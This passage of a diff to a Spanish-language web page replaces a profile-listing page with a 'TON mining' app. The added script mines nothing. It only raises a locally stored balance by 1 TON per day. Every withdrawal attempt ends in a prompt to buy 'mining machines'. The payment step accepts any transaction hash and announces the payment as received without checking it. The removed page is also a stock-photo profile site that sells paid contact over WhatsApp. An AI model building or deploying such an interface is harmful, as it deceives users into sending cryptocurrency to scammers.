+                <input type="text" id="transaction-hash" placeholder="Ingresa el hash de tu transacción">
+                <div class="error-message" id="hash-error">Por favor ingresa un hash válido</div>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="btn btn-secondary" id="cancel-payment">Cancelar</button>
+                <button class="btn btn-primary" id="confirm-payment">Pago Completado</button>
             </div>
         </div>
-
-        <!-- Barra de búsqueda -->
-        <div class="search-container">
-            <div class="search-bar">
-                <input type="text" placeholder="Buscar por nombre o intereses...">
-                <button type="submit"><i class="fas fa-search"></i></button>
-            </div>
-        </div>
-
-        <!-- Filtros por género -->
-        <div class="filters">
-            <button class="filter-btn active" data-filter="all">Todos</button>
-            <button class="filter-btn" data-filter="male">Hombres</button>
-            <button class="filter-btn" data-filter="female">Mujeres</button>
-          
-            <button class="filter-btn" data-filter="vip">VIP</button>
-        </div>
-
-        <!-- Grid de usuarios - 2 columnas en móvil -->
-        <div class="users-grid">
-            <!-- Usuario 1 - VIP -->
-            <div class="user-card vip-user" data-category="male online vip">
-                <div class="user-image">
-                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Carlos" loading="lazy">
-                   <span class="user-status online">NUEVO</span>
-                    <div class="vip-badge">VIP</div>
-                </div>
-                <div class="user-info">
-                    <h3 class="user-name">Carlos M. <i class="fas fa-check-circle verified"></i></h3>
-                    <span class="user-age">28 años</span>
-                    <p class="user-bio">Amante de deportes y naturaleza</p>
-                    <div class="user-interests">
-                        <span class="interest-tag">Deportes</span>
-                        <span class="interest-tag">Aventura</span>
-                    </div>
-                    <a href="https://wa.me/1234567890?text=Hola%20Carlos,%20vi%20tu%20perfil%20en%20SocialLink" class="whatsapp-btn">
-                        <i class="fab fa-whatsapp"></i> Contactar
-                    </a>
-                </div>
-            </div>
-
-            <!-- Usuario 2 -->
-            <div class="user-card" data-category="female">
-                <div class="user-image">
-                    <img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Ana" loading="lazy">
-                   <span class="user-status online">NUEVO</span>
-                </div>
-                <div class="user-info">
-                    <h3 class="user-name">Ana R.</h3>
-                    <span class="user-age">24 años</span>
-                    <p class="user-bio">Estudiante de arte</p>
-                    <div class="user-interests">
-                        <span class="interest-tag">Arte</span>
-                        <span class="interest-tag">Cine</span>
-                    </div>
-                    <a href="https://wa.me/1234567890?text=Hola%20Ana,%20vi%20tu%20perfil%20en%20SocialLink" class="whatsapp-btn">
-                        <i class="fab fa-whatsapp"></i> Contactar
-                    </a>
-                </div>
-            </div>
-
-            <!-- Usuario 3 - VIP -->
-            <div class="user-card vip-user" data-category="female online vip">
-                <div class="user-image">
-                    <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="María" loading="lazy">
-                   <span class="user-status online">NUEVO</span>
-                    <div class="vip-badge">VIP</div>
-                </div>
-                <div class="user-info">
-                    <h3 class="user-name">María G. <i class="fas fa-check-circle verified"></i></h3>
-                    <span class="user-age">31 años</span>
-                    <p class="user-bio">Chef profesional</p>
-                    <div class="user-interests">
-                        <span class="interest-tag">Cocina</span>
-                        <span class="interest-tag">Viajes</span>
-                    </div>
-                    <a href="https://wa.me/1234567890?text=Hola%20María,%20vi%20tu%20perfil%20en%20SocialLink" class="whatsapp-btn">
-                        <i class="fab fa-whatsapp"></i> Contactar
-                    </a>
-                </div>
-            </div>
-
-            <!-- Usuario 4 -->
-            <div class="user-card" data-category="male online">
-                <div class="user-image">
-                    <img src="https://images.unsplash.com/photo-1528892952291-009c663ce843?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Javier" loading="lazy">
-                    <span class="user-status online">NUEVO</span>
-                </div>
-                <div class="user-info">
-                    <h3 class="user-name">Javier L.</h3>
-                    <span class="user-age">26 años</span>
-                    <p class="user-bio">Desarrollador web</p>
-                    <div class="user-interests">
-                        <span class="interest-tag">Tecnología</span>
-                        <span class="interest-tag">Gaming</span>
-                    </div>
-                    <a href="https://wa.me/1234567890?text=Hola%20Javier,%20vi%20tu%20perfil%20en%20SocialLink" class="whatsapp-btn">
-                        <i class="fab fa-whatsapp"></i> Contactar
-                    </a>
-                </div>
-            </div>
-
-            <!-- Usuario 5 -->
-            <div class="user-card" data-category="female recent">
-                <div class="user-image">
-                    <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Lucía" loading="lazy">
-                    <span class="user-status online">NUEVO</span>
-                </div>
-                <div class="user-info">
-                    <h3 class="user-name">Lucía F.</h3>
-                    <span class="user-age">29 años</span>
-                    <p class="user-bio">Psicóloga</p>
-                    <div class="user-interests">
-                        <span class="interest-tag">Psicología</span>
-                        <span class="interest-tag">Lectura</span>
-                    </div>
-                    <a href="https://wa.me/1234567890?text=Hola%20Lucía,%20vi%20tu%20perfil%20en%20SocialLink" class="whatsapp-btn">
-                        <i class="fab fa-whatsapp"></i> Contactar
-                    </a>
-                </div>
-            </div>
-
-            <!-- Usuario 6 - VIP -->
-            <div class="user-card vip-user" data-category="male vip">
-                <div class="user-image">
-                    <img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60" alt="Diego" loading="lazy">
-                   <span class="user-status online">En línea</span>
-                    <div class="vip-badge">VIP</div>
-                </div>
-                <div class="user-info">
-                    <h3 class="user-name">Diego R. <i class="fas fa-check-circle verified"></i></h3>
-                    <span class="user-age">33 años</span>
-                    <p class="user-bio">Fotógrafo profesional</p>
-                    <div class="user-interests">
-                        <span class="interest-tag">Fotografía</span>
-                        <span class="interest-tag">Viajes</span>
-                    </div>
-                    <a href="https://wa.me/1234567890?text=Hola%20Diego,%20vi%20tu%20perfil%20en%20SocialLink" class="whatsapp-btn">
-                        <i class="fab fa-whatsapp"></i> Contactar
-                    </a>
-                </div>
-            </div>
-        </div>
-
-        <!-- Botón "Ver más" para móviles -->
-        <button class="load-more-btn">Ver más perfiles</button>
+    </div>
+    
+    <div class="navigation">
+        <a href="#" class="nav-item active" data-section="home-section">
+            <i class="fas fa-server"></i>
+            <span>Minería</span>
+        </a>
+        <a href="#" class="nav-item" data-section="wallet-section">
+            <i class="fas fa-wallet"></i>
+            <span>Billetera</span>
+        </a>
+        <a href="#" class="nav-item" data-section="referrals-section">
+            <i class="fas fa-users"></i>
+            <span>Referidos</span>
+        </a>
+        <a href="#" class="nav-item" data-section="machines-section">
+            <i class="fas fa-cubes"></i>
+            <span>Máquinas</span>
+        </a>
     </div>
 
-    <footer>
-        <p>© 2025 SocialLink. Todos los derechos reservados.</p>
-    </footer>
-
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Elementos del DOM
-            const filterButtons = document.querySelectorAll('.filter-btn');
-            const userCards = document.querySelectorAll('.user-card');
-            const searchInput = document.querySelector('.search-bar input');
-            const loadMoreBtn = document.querySelector('.load-more-btn');
-            const pricingOptions = document.querySelectorAll('.pricing-option');
-            const membershipBtn = document.querySelector('.membership-btn');
+        // Load saved theme preference
+        const savedTheme = localStorage.getItem('theme');
+        if (savedTheme === 'light') {
+            document.body.classList.add('light-mode');
+            document.getElementById('theme-toggle').checked = true;
+        }
+        
+        // Theme toggle functionality
+        document.getElementById('theme-toggle').addEventListener('change', function() {
+            if (this.checked) {
+                document.body.classList.add('light-mode');
+                localStorage.setItem('theme', 'light');
+            } else {
+                document.body.classList.remove('light-mode');
+                localStorage.setItem('theme', 'dark');
+            }
+        });
+        
+        // Mining functionality
+        const miningBtn = document.getElementById('mining-btn');
+        const miningStatus = document.getElementById('mining-status');
+        const counterElement = document.getElementById('ton-counter');
+        const walletBalanceElement = document.getElementById('wallet-balance');
+        const totalMinedElement = document.getElementById('total-mined');
+        const progressBar = document.getElementById('daily-progress');
+        const progressPercent = document.getElementById('progress-percent');
+        
+        let counterValue = parseFloat(localStorage.getItem('tonCounter')) || 0;
+        let isMiningActive = localStorage.getItem('miningActive') === 'true';
+        let lastUpdate = parseInt(localStorage.getItem('lastUpdate')) || Date.now();
+        let miningInterval;
+        const earningsPerSecond = 1 / (24 * 60 * 60); // 1 TON per day
+        
+        // Initialize mining state
+        function initializeMining() {
+            if (isMiningActive) {
+                startMining();
+            } else {
+                counterElement.textContent = counterValue.toFixed(6);
+                walletBalanceElement.textContent = counterValue.toFixed(6) + ' TON';
+                totalMinedElement.textContent = counterValue.toFixed(6) + ' TON';
+                updateProgress();
+            }
+        }
+        
+        // Mining button click handler
+        miningBtn.addEventListener('click', () => {
+            if (!isMiningActive) {
+                startMining();
+                localStorage.setItem('miningActive', 'true');
+            }
+        });
+        
+        function startMining() {
+            isMiningActive = true;
+            miningBtn.textContent = 'MINERÍA ACTIVADA';
+            miningBtn.disabled = true;
+            miningStatus.textContent = 'MINERÍA ACTIVA - 1.0 TON/DÍA';
             
-            // Mostrar solo 4 perfiles inicialmente en móvil
-            if (window.innerWidth < 600) {
-                const cards = Array.from(document.querySelectorAll('.user-card'));
-                cards.slice(4).forEach(card => {
-                    card.style.display = 'none';
+            // Calculate earnings based on time passed
+            const timePassed = (Date.now() - lastUpdate) / 1000;
+            counterValue += timePassed * earningsPerSecond;
+            
+            // Update counter immediately
+            updateCounter();
+            updateProgress();
+            
+            // Start the mining interval
+            miningInterval = setInterval(() => {
+                counterValue += earningsPerSecond;
+                updateCounter();
+                updateProgress();
+                localStorage.setItem('tonCounter', counterValue);
+                localStorage.setItem('lastUpdate', Date.now());
+            }, 1000);
+        }
+        
+        function updateCounter() {
+            counterElement.textContent = counterValue.toFixed(6);
+            walletBalanceElement.textContent = counterValue.toFixed(6) + ' TON';
+            totalMinedElement.textContent = counterValue.toFixed(6) + ' TON';
+            lastUpdate = Date.now();
+            localStorage.setItem('tonCounter', counterValue);
+            localStorage.setItem('lastUpdate', lastUpdate);
+        }
+        
+        function updateProgress() {
+            // Calculate progress through the day (0-100%)
+            const now = new Date();
+            const secondsToday = now.getHours() * 3600 + now.getMinutes() * 60 + now.getSeconds();
+            const progress = (secondsToday / 86400) * 100;
+            
+            progressBar.style.width = progress + '%';
+            progressPercent.textContent = Math.round(progress) + '%';
+        }
+        
+        // Initialize on load
+        initializeMining();
+        
+        // Navigation functionality
+        const navItems = document.querySelectorAll('.nav-item');
+        const sections = document.querySelectorAll('.content > div');
+        
+        navItems.forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.preventDefault();
+                
+                // Remove active class from all items
+                navItems.forEach(navItem => {
+                    navItem.classList.remove('active');
                 });
+                
+                // Add active class to clicked item
+                item.classList.add('active');
+                
+                // Hide all sections
+                sections.forEach(section => {
+                    section.classList.add('hidden');
+                });
+                
+                // Show selected section
+                const sectionId = item.getAttribute('data-section');
+                document.getElementById(sectionId).classList.remove('hidden');
+            });
+        });
+        
+        // Withdraw functionality
+        const withdrawBtn = document.getElementById('withdraw-btn');
+        const withdrawModal = document.getElementById('withdraw-modal');
+        const cancelWithdraw = document.getElementById('cancel-withdraw');
+        const confirmWithdraw = document.getElementById('confirm-withdraw');
+        const machineModal = document.getElementById('machine-modal');
+        const closeMachineModal = document.getElementById('close-machine-modal');
+        const goToMachines = document.getElementById('go-to-machines');
+        const amountError = document.getElementById('amount-error');
+        const addressError = document.getElementById('address-error');
+        
+        withdrawBtn.addEventListener('click', () => {
+            withdrawModal.style.display = 'flex';
+        });
+        
+        cancelWithdraw.addEventListener('click', () => {
+            withdrawModal.style.display = 'none';
+            amountError.style.display = 'none';
+            addressError.style.display = 'none';
+        });
+        
+        confirmWithdraw.addEventListener('click', () => {
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            const address = document.getElementById('wallet-address').value.trim();
+            
+            // Reset errors
+            amountError.style.display = 'none';
+            addressError.style.display = 'none';
+            
+            // Validate
+            let isValid = true;
+            
+            if (isNaN(amount) || amount < 0.25) {
+                amountError.style.display = 'block';
+                isValid = false;
             }
             
-            // Función para filtrar usuarios
-            function filterUsers() {
-                const activeFilter = document.querySelector('.filter-btn.active').dataset.filter;
-                const searchTerm = searchInput.value.toLowerCase();
-                
-                userCards.forEach(card => {
-                    const categories = card.dataset.category.split(' ');
-                    const name = card.querySelector('.user-name').textContent.toLowerCase();
-                    const bio = card.querySelector('.user-bio').textContent.toLowerCase();
-                    const interests = Array.from(card.querySelectorAll('.interest-tag')).map(tag => tag.textContent.toLowerCase());
-                    
-                    // Comprobar filtro y búsqueda
-                    const matchesFilter = activeFilter === 'all' || categories.includes(activeFilter);
-                    const matchesSearch = searchTerm === '' || 
-                                         name.includes(searchTerm) || 
-                                         bio.includes(searchTerm) || 
-                                         interests.some(interest => interest.includes(searchTerm));
-                    
-                    if (matchesFilter && matchesSearch) {
-                        card.style.display = 'block';
-                    } else {
-                        card.style.display = 'none';
-                    }
-                });
-                
-                // Ocultar botón "Ver más" si hay filtros activos
-                if (activeFilter !== 'all' || searchTerm !== '') {
-                    loadMoreBtn.style.display = 'none';
-                } else if (window.innerWidth < 600) {
-                    loadMoreBtn.style.display = 'block';
+            if (address.length === 0 || !address.startsWith('EQC')) {
+                addressError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (isValid) {
+                withdrawModal.style.display = 'none';
+                machineModal.style.display = 'flex';
+            }
+        });
+        
+        closeMachineModal.addEventListener('click', () => {
+            machineModal.style.display = 'none';
+        });
+        
+        goToMachines.addEventListener('click', () => {
+            machineModal.style.display = 'none';
+            
+            // Switch to machines section
+            navItems.forEach(navItem => {
+                navItem.classList.remove('active');
+                if (navItem.getAttribute('data-section') === 'machines-section') {
+                    navItem.classList.add('active');
                 }
-            }
-            
-            // Eventos para filtros
-            filterButtons.forEach(button => {
-                button.addEventListener('click', function() {
-                    filterButtons.forEach(btn => {
-                        btn.classList.remove('active');
-                        btn.style.transform = 'scale(1)';
-                    });
-                    
-                    this.classList.add('active');
-                    this.style.transform = 'scale(0.95)';
-                    filterUsers();
-                });
             });
             
-            // Evento para búsqueda
-            searchInput.addEventListener('input', filterUsers);
-            
-            // Evento para botón "Ver más"
-            if (loadMoreBtn) {
-                loadMoreBtn.addEventListener('click', function() {
-                    document.querySelectorAll('.user-card').forEach(card => {
-                        card.style.display = 'block';
-                    });
-                    this.style.display = 'none';
-                });
-            }
-            
-            // Objeto con las características de cada plan
-            const planFeatures = {
-                basic: "✓ Contacta con todos los usuarios",
-                annual: "✓ Contacta con todos los usuarios",
-                lifetime: `
-                    ✓ Acceso completo de por vida<br>
-                    ✓ Contacta con todos los usuarios<br>
-                    ✓ Etiqueta VIP y verificación de identidad<br>
-                    ✓ Perfil destacado en búsquedas<br>
-                    ✓ Soporte prioritario
-                `
-            };
-            
-            // Controlador para mostrar características de los planes
-            pricingOptions.forEach(option => {
-                option.addEventListener('click', function() {
-                    // Remover activo de todos los planes
-                    pricingOptions.forEach(opt => opt.classList.remove('active'));
-                    
-                    // Activar el plan clickeado
-                    this.classList.add('active');
-                    
-                    // Mostrar características en el contenedor
-                    const plan = this.dataset.plan;
-                    const featuresContainer = document.querySelector('.plan-features-container');
-                    featuresContainer.innerHTML = planFeatures[plan];
-                    featuresContainer.classList.add('active');
-                    
-                    // Actualizar el enlace de WhatsApp con el plan seleccionado
-                    let planText = '';
-                    
-                    if (plan === 'basic') {
-                        planText = 'Plan%20Básico%20(250%20CUP/mes)';
-                    } else if (plan === 'annual') {
-                        planText = 'Plan%20Anual%20(1000%20CUP/año)';
-                    } else {
-                        planText = 'Plan%20Vitalicio%20(1800%20CUP)';
-                    }
-                    
-                    membershipBtn.href = `https://wa.me/+14453032376?text=Estoy%20interesado%20en%20un%20plan%20de%20SocialLink`;
-                });
-            });
-            
-            // Activar el plan vitalicio por defecto
-            document.querySelector('.pricing-option[data-plan="lifetime"]').click();
-            
-            // Efecto táctil mejorado
-            const buttons = document.querySelectorAll('button, a');
-            buttons.forEach(button => {
-                button.addEventListener('touchstart', function() {
-                    this.style.transform = 'scale(0.95)';
-                });
-                button.addEventListener('touchend', function() {
-                    this.style.transform = 'scale(1)';
-                });
-            });
-            
-            // Redimensionamiento de pantalla
-            window.addEventListener('resize', function() {
-                if (window.innerWidth >= 600) {
-                    loadMoreBtn.style.display = 'none';
-                    document.querySelectorAll('.user-card').forEach(card => {
-                        card.style.display = 'block';
-                    });
+            sections.forEach(section => {
+                section.classList.add('hidden');
+                if (section.id === 'machines-section') {
+                    section.classList.remove('hidden');
                 }
             });
         });
+        
+        // Payment functionality
+        const paymentModal = document.getElementById('payment-modal');
+        const paymentTitle = document.getElementById('payment-title');
+        const paymentAmount = document.getElementById('payment-amount');
+        const cancelPayment = document.getElementById('cancel-payment');
+        const confirmPayment = document.getElementById('confirm-payment');
+        const hashError = document.getElementById('hash-error');
+        let currentMachineBtn = null;
+        
+        function showPaymentModal(machineType, amount) {
+            paymentTitle.textContent = `Comprar Máquina ${machineType}`;
+            paymentAmount.textContent = amount.toFixed(1);
+            paymentModal.style.display = 'flex';
+            
+            // Store
+                      // Store reference to the button that opened this modal
+            currentMachineBtn = document.getElementById(`${machineType.toLowerCase()}-machine-btn`.replace('á', 'a'));
+        }
+        
+        cancelPayment.addEventListener('click', () => {
+            paymentModal.style.display = 'none';
+            hashError.style.display = 'none';
+            currentMachineBtn = null;
+        });
+        
+        confirmPayment.addEventListener('click', () => {
+            const txHash = document.getElementById('transaction-hash').value.trim();
+            
+            // Validate transaction hash
+            if (txHash.length === 0) {
+                hashError.style.display = 'block';
+                return;
+            }
+            
+            // Change button text to "Verificando pago"
+            if (currentMachineBtn) {
+                currentMachineBtn.textContent = 'Verificando pago';
+                currentMachineBtn.disabled = true;
+            }
+            
+            // Here you would normally send the hash to your backend for verification
+            // For this example, we'll just show an alert
+            alert(`Pago de ${paymentAmount.textContent} TON recibido para la máquina. Verificaremos la transacción y activaremos tu máquina pronto.`);
+            
+            paymentModal.style.display = 'none';
+            document.getElementById('transaction-hash').value = '';
+            hashError.style.display = 'none';
+            currentMachineBtn = null;
+        });
+        
+        // Copy to clipboard function
+        function copyToClipboard(text) {
+            const copyMessage = document.getElementById('copy-message');
+            
+            navigator.clipboard.writeText(text).then(() => {
+                copyMessage.style.display = 'block';
+                setTimeout(() => {
+                    copyMessage.style.display = 'none';
+                }, 2000);
+            });
+        }
+
+        // Update progress bar every minute
+        setInterval(updateProgress, 60000);
     </script>
 </body>
 </html>
